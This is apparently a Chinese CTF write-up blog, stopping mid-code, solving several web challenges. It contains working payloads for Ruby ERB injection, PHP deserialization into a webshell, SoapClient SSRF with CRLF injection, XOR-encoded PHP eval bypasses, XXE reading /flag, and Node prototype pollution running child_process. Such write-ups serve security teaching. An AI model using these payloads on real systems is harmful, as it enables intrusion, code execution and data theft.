&quot;&#x2F;filebak&quot; do content_type :text erb IO.binread __FILE__ end get &quot;&#x2F;api&#x2F;auth&quot; do payload &#x3D; &#123; uid: SecureRandom.uuid , jkl: 20&#125; auth &#x3D; JWT.encode payload,ENV[&quot;SECRET&quot;] , &#39;HS256&#39; cookies[:auth] &#x3D; auth end get &quot;&#x2F;api&#x2F;info&quot; do islogin auth &#x3D; JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125; json(&#123;uid: auth[0][&quot;uid&quot;],jkl: auth[0][&quot;jkl&quot;]&#125;) end get &quot;&#x2F;shop&quot; do erb :shop end get &quot;&#x2F;work&quot; do islogin auth &#x3D; JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125; auth &#x3D; auth[0] unless params[:SECRET].nil? if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(&#x2F;[0-9a-z]+&#x2F;)&#125;&quot;) puts ENV[&quot;FLAG&quot;] end end if params[:do] &#x3D;&#x3D; &quot;#&#123;params[:name][0,7]&#125; is working&quot; then auth[&quot;jkl&quot;] &#x3D; auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10) auth &#x3D; JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39; cookies[:auth] &#x3D; auth ERB::new(&quot;&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;&#x2F;script&gt;&quot;).result end end post &quot;&#x2F;shop&quot; do islogin auth &#x3D; JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125; if auth[0][&quot;jkl&quot;] &lt; FLAGPRICE then json(&#123;title: &quot;error&quot;,message: &quot;no enough jkl&quot;&#125;) else auth &lt;&lt; &#123;flag: ENV[&quot;FLAG&quot;]&#125; auth &#x3D; JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39; cookies[:auth] &#x3D; auth json(&#123;title: &quot;success&quot;,message: &quot;jkl is good thing&quot;&#125;) end end def islogin if cookies[:auth].nil? then redirect to(&#39;&#x2F;shop&#39;) end end 这里是个ruby的模板注入漏洞 【技术分享】手把手教你如何完成Ruby ERB模板注入 - 安全客，安全资讯平台 (anquanke.com) 主要是看work路由这块 ruby没学过，也没安环境，有的地方就直接截别的师傅的博客了 先看下边这段 这段大概意思就是要我们输入的do的参数和#&#123;params[:name][0,7]&#125; is working这块进行一个比较，如果相等就会执行&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;/script&gt;这段，而#&#123;params[:name][0,7]&#125;这里我们是可以控制的，也就是所谓的ruby的Erb模板注入，注入语句的格式是&lt;%=%&gt;至少是五个字符，但是之前的参数的比较只比较name参数的前七位，所以我们实际能控制的也就只有两个字符 我们可以先试试让它输出1，特殊字符记得要先url编个码 再看上边这段，他会将我们以secret为键的参数与环境变量里的secret进行比较，然后输出境变量里的secret 这里需要用到Ruby语言的一个特性。ruby的全局变量 (3条消息) Ruby全局变量汇总_zdq0394的博客-CSDN博客 我们可以利用其中的$&#39;来返回正则匹配结果的右边 所以我们如果把传入的secret值为空，那么默认环境变量里的secret全在匹配结果的右边，也就能读出我们的密钥 &#x2F;work?name&#x3D;&lt;%25&#x3D;$%27%25&gt;&amp;do&#x3D;&lt;%25&#x3D;$%27%25&gt;%20is%20working&amp;SECRET&#x3D; 拿到密钥直接改jwt就行了 买了flag之后再对jwt解个码就能拿到flag了 [GKCTF 2021]easycms提示是后台五位弱密码 所以猜admin/admin或者是admin/12345 进入后直接访问admin.php然后admin/12345登录 这题解法有两种 第一种 设计-主题里可以进行自定义设置，而类型可以选php源代码，也就可以直接写入命令来执行 但是当你写入时会显示 这是因为在安全这里设置了文件验证 但是要取消文件验证也要有这个文件 这时候就要利用这个文件上传功能 传个文件可以看到存储路径 那如果我们重命名这个文件能不能实现目录穿越，让它上传到我们想要的目录下呢 结果是可以的 然后我们就可以去掉文件验证，然后利用cat /flag查看flag了 方法二 在导出主题的时候，我们可以看一下下载链接 http:&#x2F;&#x2F;511d2b5b-5b1e-4369-bccf-8bce11b0cea1.node4.buuoj.cn:81&#x2F;admin.php?m&#x3D;ui&amp;f&#x3D;downloadtheme&amp;theme&#x3D;L3Zhci93d3cvaHRtbC9zeXN0ZW0vdG1wL3RoZW1lL2RlZmF1bHQvMTIzLnppcA&#x3D;&#x3D; 对后边这段base64解码可以看出 这里是文件的路径，那我们可以把这个修改成/flag来直接下载flag（猜flag的文件名感觉太看运气了 这道题感觉难度不高，但更像真实环境，所以更需要思路和经验 [强网杯 2019]Upload打着文件上传名字的反序列化题 进入后先注册，登录能看到一个文件上传的页面，传个图片上去，发现能看见路径，那很显然要传个马上去连一下。 这时候我们发现cookie里有一段像base64的编码，解密一下发现是序列化的内容 一般序列化应该都会给源码，所以找一下目录，有www.tar.gz 主要是这几个文件 用phpstorm打开之后能发现index.php和register.php里被打了两个断点 register.php index.php 算是出题人给的提示吧，register那里是我们要利用的序列化的入口，registed和checker参数可控，让checker实例化proflie类就能调用profile里的魔术方法，实现我们后面的反序列化，而index那里能够对序列化内容进行反序列化，实现漏洞利用的目的。 我们再来看看profile.php &lt;?php namespace app\\web\\controller; use think\\Controller; class Profile extends Controller &#123; public $checker; public $filename_tmp; public $filename; public $upload_menu; public $ext; public $img; public $except; public function __construct() &#123; $this-&gt;checker&#x3D;new Index(); $this-&gt;upload_menu&#x3D;md5($_SERVER[&#39;REMOTE_ADDR&#39;]); @chdir(&quot;..&#x2F;public&#x2F;upload&quot;); if(!is_dir($this-&gt;upload_menu))&#123; @mkdir($this-&gt;upload_menu); &#125; @chdir($this-&gt;upload_menu); &#125; public function upload_img()&#123; if($this-&gt;checker)&#123; if(!$this-&gt;checker-&gt;login_check())&#123; $curr_url&#x3D;&quot;http:&#x2F;&#x2F;&quot;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;&#x2F;index&quot;; $this-&gt;redirect($curr_url,302); exit(); &#125; &#125; if(!empty($_FILES))&#123; $this-&gt;filename_tmp&#x3D;$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $this-&gt;filename&#x3D;md5($_FILES[&#39;upload_file&#39;][&#39;name&#39;]).&quot;.png&quot;; $this-&gt;ext_check(); &#125; if($this-&gt;ext) &#123; if(getimagesize($this-&gt;filename_tmp)) &#123; @copy($this-&gt;filename_tmp, $this-&gt;filename); @unlink($this-&gt;filename_tmp); $this-&gt;img&#x3D;&quot;..&#x2F;upload&#x2F;$this-&gt;upload_menu&#x2F;$this-&gt;filename&quot;; $this-&gt;update_img(); &#125;else&#123; $this-&gt;error(&#39;Forbidden type!&#39;, url(&#39;..&#x2F;index&#39;)); &#125; &#125;else&#123; $this-&gt;error(&#39;Unknow file type!&#39;, url(&#39;..&#x2F;index&#39;)); &#125; &#125; public function update_img()&#123; $user_info&#x3D;db(&#39;user&#39;)-&gt;where(&quot;ID&quot;,$this-&gt;checker-&gt;profile[&#39;ID&#39;])-&gt;find(); if(empty($user_info[&#39;img&#39;]) &amp;&amp; $this-&gt;img)&#123; if(db(&#39;user&#39;)-&gt;where(&#39;ID&#39;,$user_info[&#39;ID&#39;])-&gt;data([&quot;img&quot;&#x3D;&gt;addslashes($this-&gt;img)])-&gt;update())&#123; $this-&gt;update_cookie(); $this-&gt;success(&#39;Upload img successful!&#39;, url(&#39;..&#x2F;home&#39;)); &#125;else&#123; $this-&gt;error(&#39;Upload file failed!&#39;, url(&#39;..&#x2F;index&#39;)); &#125; &#125; &#125; public function update_cookie()&#123; $this-&gt;checker-&gt;profile[&#39;img&#39;]&#x3D;$this-&gt;img; cookie(&quot;user&quot;,base64_encode(serialize($this-&gt;checker-&gt;profile)),3600); &#125; public function ext_check()&#123; $ext_arr&#x3D;explode(&quot;.&quot;,$this-&gt;filename); $this-&gt;ext&#x3D;end($ext_arr); if($this-&gt;ext&#x3D;&#x3D;&quot;png&quot;)&#123; return 1; &#125;else&#123; return 0; &#125; &#125; public function __get($name) &#123; return $this-&gt;except[$name]; &#125; public function __call($name, $arguments) &#123; if($this-&gt;&#123;$name&#125;)&#123; $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments); &#125; &#125; &#125; 这是控制文件上传的部分 这里就是控制上传文件的文件名的位置。这里有三个if为了保证我们能成功执行，我们就必须绕过前两个if然后进入第三个。也就是让checker为0，然后修改cookie时不传文件，ext=1，这样我们就能进入第三个if中 但是这里对上传的格式有个判断，所以只能传图片了 这里是要利用图片马 再看下面的copy，将filename_tmp里的内容复制到filename里 而这两个变量的值是之前赋的 $this-&gt;filename_tmp&#x3D;$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $this-&gt;filename&#x3D;md5($_FILES[&#39;upload_file&#39;][&#39;name&#39;]).&quot;.png&quot;; 就是说在我们传文件之后，他会创造一个临时文件名保存这个文件，再创建一个md5后的文件名加上.png 将这个文件的内容给到.png结尾的文件中，所以无论怎么样上传最终的文件都说.png结尾的 但是我们可以先传个文件，再利用序列化修改cookie来为这两个值重新赋值，因为我们只改了cookie没有传文件，也就不会进入第二个if判断中，再通过第三个if判断的copy函数让我们传的图片马变成php文件 既然我们找到了反序列化的起点与终点，中间的过程就可以从profile里的魔术变量下手了 读取不可访问属性的值时，__get() 会被调用； 在对象中调用一个不可访问方法时，__call() 会被调用。 __get()中的return $this-&gt;except[$name];name的值就是index(跟__call的两个参数的来源差不多），所以把except赋值成二维数组，键为index值为upload_img就行了 所以链子是__destruct()-&gt;__call()-&gt;__get()-&gt;upload_img 解题步骤 先传图片马，然后找传上去的路径加在filename_tmp和filename里 &lt;?php namespace app\\web\\controller; use think\\Controller; class Profile &#123; public $checker &#x3D; 0;&#x2F;&#x2F;绕过第一个if判断 public $filename_tmp &#x3D; &#39;.&#x2F;upload&#x2F;cc551ab005b2e60fbdc88de809b2c4b1&#x2F;799bad5a3b514f096e69bbc4a7896cd9.png&#39;; public $filename &#x3D; &#39;.&#x2F;upload&#x2F;cc551ab005b2e60fbdc88de809b2c4b1&#x2F;1.php&#39; ; public $upload_menu; public $ext &#x3D; 1;&#x2F;&#x2F;进入第三个if判断 public $img; public $except &#x3D; array(&quot;index&quot;&#x3D;&gt;&quot;upload_img&quot;); &#125; class Register &#123; public $checker; public $registed &#x3D; 0; &#125; $a &#x3D; new Register(); $a-&gt;checker &#x3D;new Profile(); var_dump(base64_encode(serialize($a))); TzoyNzoiYXBwXHdlYlxjb250cm9sbGVyXFJlZ2lzdGVyIjoyOntzOjc6ImNoZWNrZXIiO086MjY6ImFwcFx3ZWJcY29udHJvbGxlclxQcm9maWxlIjo3OntzOjc6ImNoZWNrZXIiO2k6MDtzOjEyOiJmaWxlbmFtZV90bXAiO3M6Nzg6Ii4vdXBsb2FkL2NjNTUxYWIwMDViMmU2MGZiZGM4OGRlODA5YjJjNGIxLzc5OWJhZDVhM2I1MTRmMDk2ZTY5YmJjNGE3ODk2Y2Q5LnBuZyI7czo4OiJmaWxlbmFtZSI7czo0NzoiLi91cGxvYWQvY2M1NTFhYjAwNWIyZTYwZmJkYzg4ZGU4MDliMmM0YjEvMS5waHAiO3M6MTE6InVwbG9hZF9tZW51IjtOO3M6MzoiZXh0IjtpOjE7czozOiJpbWciO047czo2OiJleGNlcHQiO2E6MTp7czo1OiJpbmRleCI7czoxMDoidXBsb2FkX2ltZyI7fX1zOjg6InJlZ2lzdGVkIjtpOjA7fQ&#x3D;&#x3D; 把cookie改掉然后刷新 会报错，但是实际已经修改成功了 蚁剑连接，在根目录下找到flag bestphp&#39;s revenge session反序列化 CRLF 变量覆盖 PHP原生类SoapClient的SSRF。 &lt;?php highlight_file(__FILE__); $b &#x3D; &#39;implode&#39;; call_user_func($_GET[&#39;f&#39;], $_POST); session_start(); if (isset($_GET[&#39;name&#39;])) &#123; $_SESSION[&#39;name&#39;] &#x3D; $_GET[&#39;name&#39;]; &#125; var_dump($_SESSION); $a &#x3D; array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;); call_user_func($b, $a); ?&gt; 直接访问flag.php 发现要本地访问，再结合session_start函数，猜测是要利用session反序列化 session反序列化 php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的，默认是以文件的方式存储。存储的文件是以sess_sessionid来进行命名的，文件的内容就是session值的序列化之后的内容。 session反序列化产生的原因是由于序列化与反序列化的处理器的不同导致的，默认是php 可以用ini_set(‘session.serialize_handler’, ‘php’)来规定 如果先利用php_serialize处理器进行序列化，当我们传入的值为|O:4:“test”:0:&#123;&#125;时，序列化的结果就类似与a:1:&#123;s:1:“a”;s:16:&quot;|O:4:“test”:0:&#123;&#125;&quot;;&#125;，而如果用php处理器反序列化，会把a:1:{s:1:“a”;s:16:&quot;看作键名，将这段当作真正的序列化之后的结果来进行反序列化O:4:“test”:0:&#123;&#125;&quot; CRLF 看看p牛的文章[CRLF Injection漏洞的利用与实例分析 - phith0n (wooyun.js.org)](https://wooyun.js.org/drops/CRLF Injection漏洞的利用与实例分析.html) CRLF是”回车 + 换行”（\\r\\n）的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。 简单来说就是利用换行符在响应头里注入一些东西 SoapClient 这部分我直接贴别的师傅的博客内容了 bestphp&#39;s revenge_沐目_01的博客-CSDN博客_bestphp&#39;s revenge 从几道CTF题看SOAP安全问题 - 安全客，安全资讯平台 (anquanke.com) [LCTF]bestphp&#39;s revenge 给我的启发学习 - op_hxc - 博客园 (cnblogs.com) 因为flag.php要求本地登录，所以我们如果能用反序列化调用Soapclient来访问flag.php就能得到flag 变量覆盖 extract函数会导致变量覆盖 知识点了解之后再重新看index.php &lt;?php highlight_file(__FILE__); $b &#x3D; &#39;implode&#39;; call_user_func($_GET[&#39;f&#39;], $_POST); session_start(); if (isset($_GET[&#39;name&#39;])) &#123; $_SESSION[&#39;name&#39;] &#x3D; $_GET[&#39;name&#39;]; &#125; var_dump($_SESSION); $a &#x3D; array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;); call_user_func($b, $a); ?&gt; 要在调用Soapclient反序列化，就要有一个不存在的方法被调用，而extract可以导致变量覆盖，那我们就利用第一个回调函数，将b赋值为call_user_func，如果传入的参数是 array 型的话，会将数组的成员当作 类名 和 方法名。此时第二个回调函数的内容为 call_user_func(call_user_func(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;)) 关于reset函数：reset() 函数将内部指针指向数组中的第一个元素，并输出。在这里就相当于$_SESSION[&#39;name&#39;] 我们只要传入name=Soapclient就能将这段语句变为 call_user_func(call_user_func(array(Soapclient,&#39;welcome_to_the_lctf2018&#39;)));因为Soapclient显然没有welcome_to_the_lctf2018这个方法，也就会调用其中的_call方法，触发反序列化 在修改序列化引擎的部分 正常的话，比如我们在入门PHP的session反序列化的时候，改变php引擎的方法是ini_set（）函数，但是这个函数不接受数组，call_user_func($_GET[&#39;f&#39;], $_POST);而这里的post超级全局变量是一个数组，所以ini_set就不行了，于是使用session_start来代替，同时呢session.serialize_handler = php_serialize也变成了serialize_handler=php_serialize。 poc &lt;?php $target &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php&quot;; $attack &#x3D; new SoapClient(null,array(&#39;location&#39; &#x3D;&gt; $target, &#39;user_agent&#39; &#x3D;&gt; &quot;test\\r\\nCookie: PHPSESSID&#x3D;96sujaq7o5tl0btee8urnlsrb3\\r\\n&quot;, &#39;uri&#39; &#x3D;&gt; &quot;123&quot;)); $payload &#x3D; urlencode(serialize($attack)); echo $payload; &#x2F;&#x2F;O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A52%3A%22test%0D%0ACookie%3A+PHPSESSID%3D96sujaq7o5tl0btee8urnlsrb3%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D 然后我们再通过 extract来实现触发反序列化的操作 这实际上已经成功了，相当于用一个PHPSESSID=96sujaq7o5tl0btee8urnlsrb的账号访问到了flag.php，接下来我们只要将cookie改为这个就行了 再session反序列化的时候不知道为啥用自己的会有些问题，导致连接超时，但是换成另外的就不会这样，上面那个就是用自己cookie的结果，卡了好久，然后再刷新的时候环境都打不开了 这是用其他的cookie的结果 [ISITDTU 2019]EasyPHP这题第二个if判断可太恶心人了 &lt;?php highlight_file(__FILE__); $_ &#x3D; @$_GET[&#39;_&#39;]; if ( preg_match(&#39;&#x2F;[\\x00- 0-9\\&#39;&quot;&#96;$&amp;.,|[&#123;_defgops\\x7F]+&#x2F;i&#39;, $_) ) die(&#39;rosé will not do it&#39;); if ( strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd ) die(&#39;you are so close, omg&#39;); eval($_); ?&gt; 绕过两个if就能成功执行命令，但是第一个if正则匹配了不少东西 \\x00- 0-9 匹配\\x00到空格(\\x20)，0-9的数字 &#39;&quot;&#96;$&amp;.,|[&#123;_defgops 匹配这些字符 \\x7F 匹配DEL(\\x7F)字符 可以用这个网站看看https://regex101.com/ 既然^和~符号没被过滤，很容易想到异或和取反绕过，先取反看看phpinfo 一些命令执行函数不能用，但是还有scandir那些，可以用scandir配合print_f来读取目录 这时候就要绕过第二个if了，要求出现的字符种类不超过13个，而（）^;这已经四个了，也就是我们能控制的字符只有九个，用异或还要有一个%ff，这下只有八个了 先上脚本 str &#x3D; &#39;acdips&#39; target &#x3D; &#39;ntrfl&#39; for m in target: for a in str: for b in str: for c in str: if ord(a) ^ ord(b) ^ ord(c) &#x3D;&#x3D; ord(m): print(&quot;&#123;&#125; &#x3D; &#123;&#125;^&#123;&#125;^&#123;&#125;&quot;.format(m, a, b, c), ) print(&quot;&#123;&#125; &#x3D; &#123;&#125;^&#123;&#125;^&#123;&#125;&quot;.format(hex(~ord(m) &amp; 0xff), hex(~ord(a) &amp; 0xff), hex(~ord(b) &amp; 0xff),hex(~ord(c) &amp; 0xff))) 这是其他师傅的解释 接下来就是对照着脚本将字符替换掉就行了 ((%8f%9c%96%9c%9c%a0%9c)^(%8f%9e%96%9b%9b%a0%9e)^(%8f%8f%96%96%8c%a0%8f)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%9b%9b%96%9e)^(%8c%9c%9e%96%9b%96%9c)^(%8c%9c%9e%9c%9b%96%8f)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)); 看到了flag文件，在最后一个，所以用end将指针指向最末尾的文件，然后利用readfile或者show_source读就行了 payload ((%9e%9a%9e%9b%9e%96%9e%9a)^(%9c%9a%9e%9b%9c%96%96%9a)^(%8f%9a%9e%9b%9b%96%9b%9a)^(%ff%ff%ff%ff%ff%ff%ff%ff))(((%9a%9c%9b)^(%9a%9b%9b)^(%9a%96%9b)^(%ff%ff%ff))(((%8c%9c%9e%9b%9b%96%9e)^(%8c%9c%9e%96%9b%96%9c)^(%8c%9c%9e%9c%9b%96%8f)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff))); [CSAWQual 2019]Web_Unagi文件上传的题，不过不是传一句话，而是传xml文件，利用xxe来读flag 通过提示知道flag在/flag里， 再配合这个上传示例，可以写一个xml的文件 &lt;?xml version&#x3D;&#39;1.0&#39;?&gt; &lt;!DOCTYPE users [ &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot; &gt;]&gt; &lt;users&gt; &lt;user&gt; &lt;username&gt;&amp;xxe;&lt;&#x2F;username&gt; &lt;password&gt;&amp;xxe;&lt;&#x2F;password&gt; &lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt; &lt;email&gt;&amp;xxe;&lt;&#x2F;email&gt; &lt;group&gt;&amp;xxe;&lt;&#x2F;group&gt; &lt;intro&gt;&amp;xxe;&lt;&#x2F;intro&gt; &lt;&#x2F;user&gt; &lt;&#x2F;users&gt; 但是这里的过滤不知道是通过什么方式的，通过utf-16编码就可以绕过，utf-8就不行，所以windows可以用记事本写完之后另存为utf-16的格式，Linux就是利用iconv -f utf8 -t utf-16 2.xml&gt;1.xml的命令把utf-8转化为utf-16 [GYCTF2020]Ez_Express原型链污染和js的大小写特性 存在源码泄露，www.zip下载源码，主要是看路由的部分 var express = require('express'); var router = express.Router(); const isObject = obj => obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === Object; const merge = (a, b) => &#123; for (var attr in b) &#123; if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123; merge(a[attr], b[attr]); &#125; else &#123; a[attr] = b[attr]; &#125; &#125; return a &#125; const clone = (a) => &#123; return merge(&#123;&#125;, a); &#125; function safeKeyword(keyword) &#123; if(keyword.match(/(admin)/is)) &#123; return keyword &#125; return undefined &#125; router.get('/', function (req, res) &#123; if(!req.session.user)&#123; res.redirect('/login'); &#125; res.outputFunctionName=undefined; res.render('index',data=&#123;'user':req.session.user.user&#125;); &#125;); router.get('/login', function (req, res) &#123; res.render('login'); &#125;); router.post('/login', function (req, res) &#123; if(req.body.Submit==\"register\")&#123; if(safeKeyword(req.body.userid))&#123; res.end(\"&lt;script>alert('forbid word');history.go(-1);&lt;/script>\") &#125; req.session.user=&#123; 'user':req.body.userid.toUpperCase(), 'passwd': req.body.pwd, 'isLogin':false &#125; res.redirect('/'); &#125; else if(req.body.Submit==\"login\")&#123; if(!req.session.user)&#123;res.end(\"&lt;script>alert('register first');history.go(-1);&lt;/script>\")&#125; if(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123; req.session.user.isLogin=true; &#125; else&#123; res.end(\"&lt;script>alert('error passwd');history.go(-1);&lt;/script>\") &#125; &#125; res.redirect('/'); ; &#125;); router.post('/action', function (req, res) &#123; if(req.session.user.user!=\"ADMIN\")&#123;res.end(\"&lt;script>alert('ADMIN is asked');history.go(-1);&lt;/script>\")&#125; req.session.user.data = clone(req.body); res.end(\"&lt;script>alert('success');history.go(-1);&lt;/script>\"); &#125;); router.get('/info', function (req, res) &#123; res.render('index',data=&#123;'user':res.outputFunctionName&#125;); &#125;) module.exports = router; 我们看到登录的部分有toUpperCase，而题目要求要用ADMIN用户登录，这里可以利用js的大小写特性绕过 toUpperCase() 其中混入了两个奇特的字符&quot;ı&quot;、&quot;ſ&quot;。 这两个字符的“大写”是I和S。也就是说&quot;ı&quot;.toUpperCase() &#x3D;&#x3D; &#39;I&#39;，&quot;ſ&quot;.toUpperCase() &#x3D;&#x3D; &#39;S&#39;。通过这个小特性可以绕过一些限制。 toLowerCase() 这个&quot;K&quot;的“小写”字符是k，也就是&quot;K&quot;.toLowerCase() &#x3D;&#x3D; &#39;k&#39;. 利用admın注册就可以 登录后提示flag在/flag里 而源码中存在着merge函数 而info中 outputFunction正好又是未定义，info还会将outputFunctionName渲染到页面中 所以我们可以给对象原型的类添加一个outputFunctionName属性，通过它得到flag。 payload： &#123;&quot;lua&quot;:&quot;php&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cat &#x2F;flag&#39;)&#x2F;&#x2F;&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125; 不太理解这里最后的&#x2F;&#x2F;的含义，但是没有这个不会成功执行，而且会出现报错，所以我认为可能是对后文的注释，而且用 &#123;&quot;lua&quot;:&quot;php&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cat &#x2F;flag&#39;);x&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125;也能成功，所以应该就是为了保证语句的完整 这时候再访问一下/info就能下载到flag文件 [安洵杯 2019]不是文件上传确实不是文件上传，只能传图片而且路径也没有，这其实是一个搭配反序列化的sql题 show.php: &lt;?php include(&quot;.&#x2F;helper.php&quot;); $show &#x3D; new show(); if($_GET[&quot;delete_all&quot;])&#123; if($_GET[&quot;delete_all&quot;] &#x3D;&#x3D; &quot;true&quot;)&#123; $show-&gt;Delete_All_Images(); &#125; &#125; $show-&gt;Get_All_Images(); class show&#123; public $con; public function __construct()&#123; $this-&gt;con &#x3D; mysqli_connect(&quot;127.0.0.1&quot;,&quot;r00t&quot;,&quot;r00t&quot;,&quot;pic_base&quot;); if (mysqli_connect_errno($this-&gt;con))&#123; die(&quot;Connect MySQL Fail:&quot;.mysqli_connect_error()); &#125; &#125; public function Get_All_Images()&#123; $sql &#x3D; &quot;SELECT * FROM images&quot;; $result &#x3D; mysqli_query($this-&gt;con, $sql); if ($result-&gt;num_rows &gt; 0)&#123; while($row &#x3D; $result-&gt;fetch_assoc())&#123; if($row[&quot;attr&quot;])&#123; $attr_temp &#x3D; str_replace(&#39;\\0\\0\\0&#39;, chr(0).&#39;*&#39;.chr(0), $row[&quot;attr&quot;]); $attr &#x3D; unserialize($attr_temp); &#125; echo &quot;&lt;p&gt;id&#x3D;&quot;.$row[&quot;id&quot;].&quot; filename&#x3D;&quot;.$row[&quot;filename&quot;].&quot; path&#x3D;&quot;.$row[&quot;path&quot;].&quot;&lt;&#x2F;p&gt;&quot;; &#125; &#125;else&#123; echo &quot;&lt;p&gt;You have not uploaded an image yet.&lt;&#x2F;p&gt;&quot;; &#125; mysqli_close($this-&gt;con); &#125; public function Delete_All_Images()&#123; $sql &#x3D; &quot;DELETE FROM images&quot;; $result &#x3D; mysqli_query($this-&gt;con, $sql); &#125; &#125; upload.php &lt;?php include(&quot;.&#x2F;helper.php&quot;); class upload extends helper &#123; public function upload_base()&#123; $this-&gt;upload(); &#125; &#125; if ($_FILES)&#123; if ($_FILES[&quot;file&quot;][&quot;error&quot;])&#123; die(&quot;Upload file failed.&quot;); &#125;else&#123; $file &#x3D; new upload(); $file-&gt;upload_base(); &#125; &#125; $a &#x3D; new helper(); helper.php &lt;?php class helper &#123; protected $folder &#x3D; &quot;pic&#x2F;&quot;; protected $ifview &#x3D; False; protected $config &#x3D; &quot;config.txt&quot;; &#x2F;&#x2F; The function is not yet perfect, it is not open yet. public function upload($input&#x3D;&quot;file&quot;) &#123; $fileinfo &#x3D; $this-&gt;getfile($input); $array &#x3D; array(); $array[&quot;title&quot;] &#x3D; $fileinfo[&#39;title&#39;]; $array[&quot;filename&quot;] &#x3D; $fileinfo[&#39;filename&#39;]; $array[&quot;ext&quot;] &#x3D; $fileinfo[&#39;ext&#39;]; $array[&quot;path&quot;] &#x3D; $fileinfo[&#39;path&#39;]; $img_ext &#x3D; getimagesize($_FILES[$input][&quot;tmp_name&quot;]); $my_ext &#x3D; array(&quot;width&quot;&#x3D;&gt;$img_ext[0],&quot;height&quot;&#x3D;&gt;$img_ext[1]); $array[&quot;attr&quot;] &#x3D; serialize($my_ext); $id &#x3D; $this-&gt;save($array); if ($id &#x3D;&#x3D; 0)&#123; die(&quot;Something wrong!&quot;); &#125; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;p&gt;Your images is uploaded successfully. And your image&#39;s id is $id.&lt;&#x2F;p&gt;&quot;; &#125; public function getfile($input) &#123; if(isset($input))&#123; $rs &#x3D; $this-&gt;check($_FILES[$input]); &#125; return $rs; &#125; public function check($info) &#123; $basename &#x3D; substr(md5(time().uniqid()),9,16); $filename &#x3D; $info[&quot;name&quot;]; $ext &#x3D; substr(strrchr($filename, &#39;.&#39;), 1); $cate_exts &#x3D; array(&quot;jpg&quot;,&quot;gif&quot;,&quot;png&quot;,&quot;jpeg&quot;); if(!in_array($ext,$cate_exts))&#123; die(&quot;&lt;p&gt;Please upload the correct image file!!!&lt;&#x2F;p&gt;&quot;); &#125; $title &#x3D; str_replace(&quot;.&quot;.$ext,&#39;&#39;,$filename); return array(&#39;title&#39;&#x3D;&gt;$title,&#39;filename&#39;&#x3D;&gt;$basename.&quot;.&quot;.$ext,&#39;ext&#39;&#x3D;&gt;$ext,&#39;path&#39;&#x3D;&gt;$this-&gt;folder.$basename.&quot;.&quot;.$ext); &#125; public function save($data) &#123; if(!$data || !is_array($data))&#123; die(&quot;Something wrong!&quot;); &#125; $id &#x3D; $this-&gt;insert_array($data); return $id; &#125; public function insert_array($data) &#123; $con &#x3D; mysqli_connect(&quot;127.0.0.1&quot;,&quot;r00t&quot;,&quot;r00t&quot;,&quot;pic_base&quot;); if (mysqli_connect_errno($con)) &#123; die(&quot;Connect MySQL Fail:&quot;.mysqli_connect_error()); &#125; $sql_fields &#x3D; array(); $sql_val &#x3D; array(); foreach($data as $key&#x3D;&gt;$value)&#123; $key_temp &#x3D; str_replace(chr(0).&#39;*&#39;.chr(0), &#39;\\0\\0\\0&#39;, $key); $value_temp &#x3D; str_replace(chr(0).&#39;*&#39;.chr(0), &#39;\\0\\0\\0&#39;, $value); $sql_fields[] &#x3D; &quot;&#96;&quot;.$key_temp.&quot;&#96;&quot;; $sql_val[] &#x3D; &quot;&#39;&quot;.$value_temp.&quot;&#39;&quot;; &#125; $sql &#x3D; &quot;INSERT INTO images (&quot;.(implode(&quot;,&quot;,$sql_fields)).&quot;) VALUES(&quot;.(implode(&quot;,&quot;,$sql_val)).&quot;)&quot;; mysqli_query($con, $sql); $id &#x3D; 